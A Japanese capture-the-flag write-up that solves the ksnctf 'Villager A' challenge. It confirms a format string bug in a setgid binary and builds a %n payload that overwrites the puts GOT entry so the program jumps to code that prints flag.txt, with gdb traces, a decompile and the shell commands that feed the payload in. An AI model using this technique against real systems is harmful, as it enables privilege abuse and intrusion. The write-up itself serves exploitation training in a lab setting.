## Villager A

![](img/villagerA1.png) 

問題ページにSSHで接続してくるように促しているので、接続する。  
すると、`flag.txt`と`q4`の32bitのELFファイルが置かれていた。
flag.txtファイルは権限がなく読み込めない。  


```
[q4@eceec62b961b ~]$ ls
flag.txt  q4
[q4@eceec62b961b ~]$ cat flag.txt 
cat: flag.txt: Permission denied
[q4@eceec62b961b ~]$ file q4 
q4: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.18, BuildID[sha1]=526c75e7f0f34744808eb1b09a5a91880562efc8, not stripped
[q4@eceec62b961b ~]$ file flag.txt 
flag.txt: regular file, no read permission
[q4@eceec62b961b ~]$ ls -la
total 32
dr-xr-xr-x 1 root root 4096 Feb 27  2021 .
drwxr-xr-x 1 root root 4096 Feb 27  2021 ..
-rw-r--r-- 1 root root   18 Jul 21  2020 .bash_logout
-rw-r--r-- 1 root root  141 Jul 21  2020 .bash_profile
-rw-r--r-- 1 root root  456 Feb 27  2021 .bashrc
-r--r----- 1 root q4a    22 Feb 26  2021 flag.txt
-r-xr-sr-x 1 root q4a  5857 Feb 26  2021 q4
[q4@eceec62b961b ~]$
```

q4は実行権限があるみたいなので実行してみる。 
```
[q4@eceec62b961b ~]$ ./q4 
What's your name?
hogehogeman
Hi, hogehogeman

Do you want the flag?
yes
Do you want the flag?
yes
Do you want the flag?
no
I see. Good bye.
[q4@eceec62b961b ~]$ 
```

最初に名前を聞かれ、flagが欲しいか聞かれ、諦めたらGood byeされた。  

入力した文字を出力しているので、Format String Bugを試す。  

```
What's your name?
AAAA %x %x %x %x %x %x %x %x
Hi, AAAA 400 e93495c0 e9501f28 e976a5e8 e972ece0 41414141 20782520 25207825

Do you want the flag?
```

FSBの欠陥が存在し、スタックに格納されているデータが漏洩された。  
また入力した"AAAA"が7番目に表示されているのがわかる（A -> 0x41）


***解析開始***

SSH先のサーバで解析作業するのは面倒なので、ローカルに持ってくる。  
`scp -P 10004 q4@ctfq.u1tramarine.blue:~/q4 .`

GDBを使用して、mainにbreak pointをして実行。  
gdbの拡張スクリプトにより`start`コマンドでmain関数で止まってくれる。  


```
pwndbg> start
Temporary breakpoint 1 at 0x80485b7

Temporary breakpoint 1, 0x080485b7 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────
 EAX  0x80485b4 (main) ◂— push ebp
 EBX  0xf7bdbe34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* ',\r#' */
 ECX  0x9e6b51fc
 EDX  0xffffcf90 —▸ 0xf7bdbe34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* ',\r#' */
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
 ESI  0x80486f0 (__libc_csu_init) ◂— push ebp
 EBP  0xffffcf68 ◂— 0
 ESP  0xffffcf68 ◂— 0
 EIP  0x80485b7 (main+3) ◂— and esp, 0xfffffff0
─────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────
 ► 0x80485b7 <main+3>     and    esp, 0xfffffff0                     ESP => 0xffffcf60 (0xffffcf68 & 0xfffffff0)
   0x80485ba <main+6>     sub    esp, 0x420                          ESP => 0xffffcb40 (0xffffcf60 - 0x420)
   0x80485c0 <main+12>    mov    dword ptr [esp], __dso_handle+4     [0xffffcb40] <= 0x80487a4 (__dso_handle+4) ◂— push edi /* "What's your name?" */
   0x80485c7 <main+19>    call   puts@plt                    <puts@plt>
 
   0x80485cc <main+24>    mov    eax, dword ptr [0x8049a04]          EAX, [stdin@@GLIBC_2.0]
   0x80485d1 <main+29>    mov    dword ptr [esp + 8], eax
   0x80485d5 <main+33>    mov    dword ptr [esp + 4], 0x400
   0x80485dd <main+41>    lea    eax, [esp + 0x18]
   0x80485e1 <main+45>    mov    dword ptr [esp], eax
   0x80485e4 <main+48>    call   fgets@plt                   <fgets@plt>
 
   0x80485e9 <main+53>    mov    dword ptr [esp], __dso_handle+22
──────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ ebp esp 0xffffcf68 ◂— 0
01:0004│+004     0xffffcf6c —▸ 0xf79cfcb9 (__libc_start_call_main+121) ◂— add esp, 0x10
02:0008│+008     0xffffcf70 ◂— 1
03:000c│+00c     0xffffcf74 —▸ 0xffffd024 —▸ 0xffffd20a ◂— '/home/er/ksnctf/villager/q4'
04:0010│+010     0xffffcf78 —▸ 0xffffd02c —▸ 0xffffd226 ◂— 'SHELL=/bin/bash'
05:0014│+014     0xffffcf7c —▸ 0xffffcf90 —▸ 0xf7bdbe34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* ',\r#' */
06:0018│+018     0xffffcf80 —▸ 0xf7bdbe34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* ',\r#' */
07:001c│+01c     0xffffcf84 —▸ 0x80485b4 (main) ◂— push ebp
────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────
 ► 0 0x80485b7 main+3
   1 0xf79cfcb9 __libc_start_call_main+121
   2 0xf79cfd7c __libc_start_main+140
   3 0x8048521 _start+33
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

入力処理を終えた後の出力処理を見てみる。  


```
───────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────
 EAX  0xffffcb58 ◂— 'AAAA\n'
 EBX  0xf7bdbe34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* ',\r#' */
 ECX  0
 EDX  0
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0
 ESI  0x80486f0 (__libc_csu_init) ◂— push ebp
 EBP  0xffffcf68 ◂— 0
 ESP  0xffffcb40 —▸ 0xffffcb58 ◂— 'AAAA\n'
*EIP  0x80485fc (main+72) —▸ 0xfffeb3e8 ◂— 0
─────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────
   0x80485e4 <main+48>     call   fgets@plt                   <fgets@plt>
 
   0x80485e9 <main+53>     mov    dword ptr [esp], __dso_handle+22     [0xffffcb40] <= 0x80487b6 (__dso_handle+22) ◂— dec eax /* 'Hi, ' */
   0x80485f0 <main+60>     call   printf@plt                  <printf@plt>
 
   0x80485f5 <main+65>     lea    eax, [esp + 0x18]                    EAX => 0xffffcb58 ◂— 'AAAA\n'
   0x80485f9 <main+69>     mov    dword ptr [esp], eax                 [0xffffcb40] <= 0xffffcb58 ◂— 'AAAA\n'
 ► 0x80485fc <main+72>     call   printf@plt                  <printf@plt>
        format: 0xffffcb58 ◂— 'AAAA\n'
        vararg: 0x400
 
   0x8048601 <main+77>     mov    dword ptr [esp], 0xa
   0x8048608 <main+84>     call   putchar@plt                 <putchar@plt>
 
   0x804860d <main+89>     mov    dword ptr [esp + 0x418], 1
   0x8048618 <main+100>    jmp    main+205                    <main+205>
    ↓
   0x8048681 <main+205>    mov    eax, dword ptr [esp + 0x418]
──────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ esp 0xffffcb40 —▸ 0xffffcb58 ◂— 'AAAA\n'
01:0004│-424 0xffffcb44 ◂— 0x400
02:0008│-420 0xffffcb48 —▸ 0xf7bdc5c0 (_IO_2_1_stdin_) ◂— 0xfbad2288
03:000c│-41c 0xffffcb4c —▸ 0xf7d94f28 ◂— 'GLIBCXX_3.4'
04:0010│-418 0xffffcb50 —▸ 0xf7ffd5e8 (_rtld_global+1512) —▸ 0xf7fc9000 ◂— 0x464c457f
05:0014│-414 0xffffcb54 —▸ 0xf7fc1ce0 —▸ 0xf79ab000 ◂— 0x464c457f
06:0018│ eax 0xffffcb58 ◂— 'AAAA\n'
07:001c│-40c 0xffffcb5c —▸ 0xf79b000a ◂— 0x2408100
────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────
 ► 0 0x80485fc main+72
   1 0xf79cfcb9 __libc_start_call_main+121
   2 0xf79cfd7c __libc_start_main+140
   3 0x8048521 _start+33
```

"DISASM"のアセンブリコードを見てみると、printf()関数に渡している引数が1つしかない。  
printf()は`printf("output: %s", input)のように書式指定を含めて使う必要がある。  
printf(input)のように直接変数を表示してしまうと、  入力した文字の中に書式指定が含まれているとprintf()は引数が渡されているものだと勘違いしてstackからデータを持ってきてしまう。  

通常は以下の例のように書式指定を含めた引数を2つstackに積む必要がある。  
```
 ► 0x565561ef <main+82>     sub    esp, 8                  ESP => 0xffffce58 (0xffffce60 - 0x8)
   0x565561f2 <main+85>     lea    eax, [ebp - 0x108]      EAX => 0xffffce60 ◂— 'AAAA\n'
   0x565561f8 <main+91>     push   eax
   0x565561f9 <main+92>     lea    eax, [ebx - 0x1fa4]     EAX => 0x5655702c ◂— 'output: %s\n'
   0x565561ff <main+98>     push   eax
   0x56556200 <main+99>     call   printf@plt                  <printf@plt>
```

FSBの欠陥が存在することがわかった。  
FSBを利用することによって任意のメモリ読み取りが可能になる。  
問題の実行ファイルがflag.txtを読み込んでいた場合は読み取ることができる。  

以下は、ghidraでDecompileを行った結果である。  

```
undefined4 main(void)

{
  char *pcVar1;
  int iVar2;
  char local_418 [1024];
  int local_18;
  FILE *local_14;
  
  puts("What\'s your name?");
  fgets(local_418,0x400,stdin);
  printf("Hi, ");
  printf(local_418);
  putchar(10);
  local_18 = 1;
  while( true ) {
    if (local_18 == 0) {
      local_14 = fopen("flag.txt","r");
      fgets(local_418,0x400,local_14);
      printf(local_418);
      return 0;
    }
    puts("Do you want the flag?");
    pcVar1 = fgets(local_418,0x400,stdin);
    if (pcVar1 == (char *)0x0) break;
    iVar2 = strcmp(local_418,"no\n");
    if (iVar2 == 0) {
      puts("I see. Good bye.");
      return 0;
    }
  }
  return 0;
}
```

ghidraからでもprintf()の問題箇所が見て取れる。  

whileループの中で、`local_18`の値が0の場合にflag.txtを読み込んで表示しているのがわかる。  

つまり、この処理にjmpしたらflag.txtを表示できる。  

"Do you want the flag?"を聞いてくるputs()関数のコードを見てみる。  

```
080484c4 <puts@plt>:
 80484c4:	ff 25 f4 99 04 08    	jmp    DWORD PTR ds:0x80499f4
 80484ca:	68 30 00 00 00       	push   0x30
 80484cf:	e9 80 ff ff ff       	jmp    8048454 <.plt>
```

0x80484c4で0x80499f4にjmpしている。  
0x80499f4のアドレスをflag.txtを表示させる処理の開始アドレス0x08048691に書き換える。  

噛み砕くと、`jmp DWORD PTR ds:0x80499f4`は、  
データセグメントのアドレス 0x80499f4 に格納されている値をジャンプ先のアドレスとして使用する、間接ジャンプを意味している。  

書式指定子である`%n`は画面に出力した文字数を書き込むもので、これを利用して任意のアドレスを書き換えられる。  

`\xf4\x99\x04\x08%134514317x%6$n`

最初の`\xf4\x99\x04\x08`は書き換え対象の0x080499f4をリトルエンディアンで表したもの。  
次の`%134514317x`は書き換えアドレス0x08048691を10進数で表し、最初のアドレス分の4byteを減算したもの。  
`%6`はstackに積まれる順序の6番目を表す（AAAAが表示された場所）。  

以下のようにpayloadを作成し、q4に流せばflag.txtが手に入る。  

`echo -e "\xf4\x99\x04\x08%134514317x%6\$n" > input`  
`./q4 < input`  


END.
